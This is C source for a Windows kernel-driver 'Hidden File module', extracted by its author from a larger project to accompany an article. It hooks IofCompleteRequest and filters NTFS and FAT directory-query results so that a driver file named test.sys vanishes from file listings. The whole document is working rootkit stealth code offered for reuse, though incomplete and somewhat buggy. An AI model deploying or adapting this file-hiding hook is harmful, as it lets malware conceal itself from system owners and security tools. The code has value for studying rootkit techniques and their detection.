//
//Hidden File module
//written by CardMagic  
//Email : sunmy1@sina.com
//MSN: onlyonejazz at hotmail.com
//

//
//This code is incomplete, because I just extracted it from 
//a big project.It only include the material that related to
//my article .You have to add this code into your own driver code.
//
//

#define HIDESYS L"test.sys"

extern POBJECT_TYPE *IoDeviceObjectType,*IoDriverObjectType;
DWORD ntfsstart = 0,ntfsend = 0;
DWORD fatstart = 0,fatend = 0;

LIST_ENTRY RawHandlesListHead;
KSPIN_LOCK RawHandlesLock;

TypeIofCompleteRequest orgcomcall = 0;




PVOID
MapUserBuffer (
				   IN OUT PIRP Irp
				  )

				  /*++

				  Routine Description:

				  This routine conditionally maps the user buffer for the current I/O
				  request in the specified mode.  If the buffer is already mapped, it
				  just returns its address.

				  Note that this is the *input/output* buffer.

				  Arguments:

				  Irp - Pointer to the Irp for the request.

				  Return Value:

				  Mapped address

				  --*/

{

	//
	// If there is no Mdl, then we must be in the Fsd, and we can simply
	// return the UserBuffer field from the Irp.
	//

	if (Irp->MdlAddress == NULL) {

		return Irp->UserBuffer;

	} else {

		PVOID Address = MmGetSystemAddressForMdlSafe( Irp->MdlAddress, NormalPagePriority );

		return Address;
	}
}


int HideSingle(PIRP Irp,PVOID buf,PVOID prebuf,BOOLEAN bRetsingle)
{
	PWCHAR p;
	PDWORD len;
	PWCHAR sp;
	PDWORD slen;
	


	PIO_STACK_LOCATION irpsp = IoGetCurrentIrpStackLocation(Irp);
	switch(irpsp->Parameters.QueryDirectory.FileInformationClass)
	{
	case FileBothDirectoryInformation: 
		p = ((PFILE_BOTH_DIR_INFORMATION)buf)->FileName;
		len = &(((PFILE_BOTH_DIR_INFORMATION)buf)->FileNameLength);
		sp = ((PFILE_BOTH_DIR_INFORMATION)buf)->ShortName;
		slen = ((PFILE_BOTH_DIR_INFORMATION)buf)->ShortNameLength;
		break;
	case FileFullDirectoryInformation: 
		p = ((PFILE_FULL_DIR_INFORMATION)buf)->FileName;
		len = &(((PFILE_FULL_DIR_INFORMATION)buf)->FileNameLength);
		break;
	case FileNamesInformation: 
		p = ((PFILE_NAMES_INFORMATION)buf)->FileName;
		len = &(((PFILE_NAMES_INFORMATION)buf)->FileNameLength);
		break;
	case FileDirectoryInformation: 
		p = ((PFILE_DIRECTORY_INFORMATION)buf)->FileName;
		len = &(((PFILE_DIRECTORY_INFORMATION)buf)->FileNameLength);
		break;
	case FileIdBothDirectoryInformation:
		p = ((PFILE_ID_BOTH_DIR_INFORMATION )buf)->FileName;
		len = &(((PFILE_ID_BOTH_DIR_INFORMATION )buf)->FileNameLength);
		sp = ((PFILE_BOTH_DIR_INFORMATION)buf)->ShortName;
		slen = ((PFILE_BOTH_DIR_INFORMATION)buf)->ShortNameLength;
		break;
	case FileIdFullDirectoryInformation:
		p = ((PFILE_ID_FULL_DIR_INFORMATION)buf)->FileName;
		len = &(((PFILE_ID_FULL_DIR_INFORMATION )buf)->FileNameLength);
		break;

	default:
		return FALSE;


	}

	if(p)
	{
		//if(Irp->Tail->Overlay.Thread)
		//	KeStackAttachProcess()
	
		if(*len == wcslen(HIDESYS)*2)
		{
			if(!_wcsnicmp(p,HIDESYS, wcslen(HIDESYS))
			{
				if(!bRetsingle)
				{
					if(*(PULONG)buf)
					{
						if(prebuf)
						{
							if(buf != prebuf)
							{

								*(PULONG)prebuf += *(PULONG)buf;
							}
							else
							{
								RtlCopyMemory(buf,(PBYTE)buf+*(PULONG)buf,Irp->IoStatus.Information-*(PULONG)buf);

							}
						}


					}
					else
					{
						
						if(prebuf == buf)
						{
							RtlZeroMemory(buf,Irp->IoStatus.Information);
                            Irp->IoStatus.Information = 0;
							Irp->IoStatus.Status = STATUS_NO_MORE_FILES;
							


						}
						*(PULONG)prebuf = 0;

					}

					//p[0] = 0;
					//*len = 0;


				}
				else
				{
					Irp->IoStatus.Information = 0;
					IoSkipCurrentIrpStackLocation(Irp);
					IofCallDriver(irpsp->FileObject->Vpb->DeviceObject,Irp);
					

					return -1;



				}

				return TRUE;		
			}
		}

	}

	return FALSE;
}

VOID
FASTCALL
MyIofCompleteRequest(
				   IN PIRP Irp,
				   IN CCHAR PriorityBoost
				   )
{
	 DWORD calleraddr;
	 PIO_STACK_LOCATION irpsp;
	 PVOID buf,prebuf;


	 _asm mov eax,[ebp+4]
	 _asm mov calleraddr,eax


		
	//
	//We check if the routine is called by file system
	//
	 if(
		 ((calleraddr>ntfsstart)&&(calleraddr<ntfsend))
		 ||
		 ((calleraddr>fatstart)&&(calleraddr<fatend))
		 )
	 {
		 irpsp = IoGetCurrentIrpStackLocation(Irp);
		 if(irpsp)
		 {
			 if(irpsp->MajorFunction == IRP_MJ_DIRECTORY_CONTROL)
			 {
				 if(
					 (irpsp->MinorFunction == IRP_MN_QUERY_DIRECTORY)
					&&
					 (NT_SUCCESS(Irp->IoStatus.Status))
					 &&
					 (Irp->IoStatus.Information)
					 )
				 {
					 prebuf = buf = MapUserBuffer(Irp);


					if((irpsp->Flags&SL_RETURN_SINGLE_ENTRY) == SL_RETURN_SINGLE_ENTRY)
					{
						if( -1 == HideSingle(Irp,buf,0,TRUE))
							return;

					}
					else
					{
			

						if(!HideSingle(Irp,buf,prebuf,FALSE))
						{
							while(*(PULONG)buf)
							{

								prebuf = buf;
								buf = (PBYTE)buf + *(PULONG)buf;

								if(HideSingle(Irp,buf,prebuf,FALSE))
									break;
								
								
							}

						}

					}




				 }
				
			 }

		 }

		 
	 }

	 

	 orgcomcall(Irp,PriorityBoost);

}



void HideFile()
{
	NTSTATUS status;
	UNICODE_STRING fsname;
	PDRIVER_OBJECT fsdrvobj = 0;


	RtlInitUnicodeString(&fsname,L"\\FileSystem\\ntfs");

	status = ObReferenceObjectByName(&fsname,OBJ_CASE_INSENSITIVE,NULL,0,*IoDriverObjectType,KernelMode,NULL,&fsdrvobj);

	if(NT_SUCCESS(status))
	{
		ntfsstart = fsdrvobj->DriverStart;
		ntfsend = (DWORD)fsdrvobj->DriverStart+fsdrvobj->DriverSize;
	}


	RtlInitUnicodeString(&fsname,L"\\FileSystem\\fastfat");

	status = ObReferenceObjectByName(&fsname,OBJ_CASE_INSENSITIVE,NULL,0,*IoDriverObjectType,KernelMode,NULL,&fsdrvobj);

	if(NT_SUCCESS(status))
	{
		fatstart = fsdrvobj->DriverStart;
		fatend = (DWORD)fsdrvobj->DriverStart+fsdrvobj->DriverSize;
	}

	HookCode((DWORD)IofCompleteRequest,(DWORD)MyIofCompleteRequest,(DWORD*)&orgcomcall);

		



}

	
